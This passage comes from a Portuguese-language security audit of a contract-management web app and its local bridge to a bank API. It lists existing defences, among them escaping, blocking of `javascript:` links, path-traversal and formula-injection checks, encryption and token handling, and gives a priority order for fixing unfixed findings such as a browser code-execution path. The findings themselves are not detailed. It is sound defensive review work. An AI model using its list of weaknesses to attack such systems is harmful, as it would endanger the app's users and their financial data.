- `esc()` (`docs/js/formularios.js:4`) escapa `& < > " '`; é usado de forma consistente em texto de usuário nas telas (nomes, descrições, históricos — `telas/comum.js:55-74`, `tabelaHistorico`), em `data-*` (`botao`, `comum.js:20`) e em `href` com dado do usuário (`telas/contrato.js:576` com `rel="noopener noreferrer"`; `:662` `mailto:`); o campo `vistoria_link` (`formularios.js:563-566`) força `https://` quando não há esquema e recusa espaços — bloqueia `javascript:`. WhatsApp usa só dígitos (`contrato.js:625`). Contratos/HTML (`contratos.js:333 escH`) e Word/XML (`:415 escX`, `:426`) escapam.
- A logo é redesenhada num canvas e gravada como PNG data URL (`telas/admin.js:199-222`): um SVG com script nunca é guardado; `esc(E.d.logo)` em `app.js:408`; a marca-d'água embute a logo em SVG via `btoa` (`contratos.js:343-345`), sem quebra de CSS.
- Respostas da ViaCEP/BrasilAPI/Banco Central só vão para `.value` de inputs ou passam por `esc()` (`telas/campos.js:44-55,82-97,440-447,492-502`); erros caem em `catch` com mensagem fixa.
- Nomes de arquivo: `limparNome` (`armazenamento.js:118-121`) remove `/ \ : * ? " < > |` e controles, corta pontos/espaços finais (`..` vira "sem nome"); `importarZip` recusa `..`, caminhos absolutos e pastas fora de `arquivos/`/`modelos/`, e faz backup antes.
- Não há `eval`, `new Function`, `document.write` nem `innerHTML` com dado não escapado fora dos pontos A1/A2; `TELAS[nome]`/`ACOES[acao]` com nomes vindos da URL não permitem execução (chaves herdadas devolvem objetos, não HTML perigoso). Não encontrei vetor de poluição global de protótipo: `Object.assign` sempre com chaves de formulário; `desfazerAlteracoes` (`regras.js:349`) escreve `r[k]` só no próprio registro.
- Gravação concorrente: fila (`app.js:87-121`), releitura do disco e `revisao`.
- Histórico e exportação escondem segredos: `OCULTOS` (`regras.js:267`) e `SECRETO` (`exportar.js:15`); ExcelJS grava texto como texto (sem injeção de fórmula); `senha_ponte` não entra no histórico (`[ada] regras.js:3335`).
- Sessão: token aleatório de 128 bits, conferido contra o banco, removido ao sair; sair numa aba sai em todas (`app.js:72-81`).
- Backup seguro: AES-GCM 256 com IV aleatório por arquivo, RSA-OAEP 3072, PBKDF2 310k com sal aleatório; gravação sem senha e restauração só com senha; integridade do conteúdo garantida pelo GCM.
- Ponte: `crypto.timingSafeEqual` na senha; CORS fechado por lista (reflete só origens cadastradas, testado em `tests/ponte-c6.test.mjs:57-58`); escuta em `127.0.0.1` por padrão; mTLS com `https.request` e verificação de certificado do servidor ativa; token do C6 só em memória, renovado 60 s antes de vencer, `access_token` mascarado nos registros, `client_secret` nunca gravado; `.env`, `contas/`, `notificacoes/`, `registros/` no `.gitignore` da ponte; `.env.exemplo` sem segredo real; ids de rota restritos a `[A-Za-z0-9_-]` e `encodeURIComponent` nos caminhos ao banco (sem path traversal/SSRF; a URL base do banco vem só da configuração); corpo limitado a 2 MB; `external_reference_id` validado (26 chars A-Z0-9); webhook tratado só como sinal para reconsultar. Fase 2: validação estrita de datas (`c6-datas.mjs:7-12`), janelas de 30/60 dias, limites de 366 dias, validação de código de barras/Pix/valor (`c6-pagamentos.mjs:62-77`), PDF com escape de `( ) \` (`pdf-minimo.mjs:11`), grupo `^[A-Za-z0-9_-]{1,64}$`; o banco nunca paga sem aprovação no app do C6.
- Dados de teste do projeto (CPF `529.982.247-25`, CNPJ `11.222.333/0001-81`) usados nos simulados.

## 6. Ordem sugerida de correção

1. A1 + A2 + M1 (um PR: validação dos parâmetros de URL, `abrirArquivo` seguro, `accept`, CSP) — fecha o caminho de execução de código no navegador.
2. M2 + M3 + M4 + M6 na ponte antes de qualquer exposição por túnel; Cloudflare Access como pré-requisito do túnel.
3. M7 + M8 (senhas e sessão), B2 (backup), B1 (jsPDF), B5 no merge.
4. Decidir sobre a cifra do JSON (seção 3) depois dos itens acima.
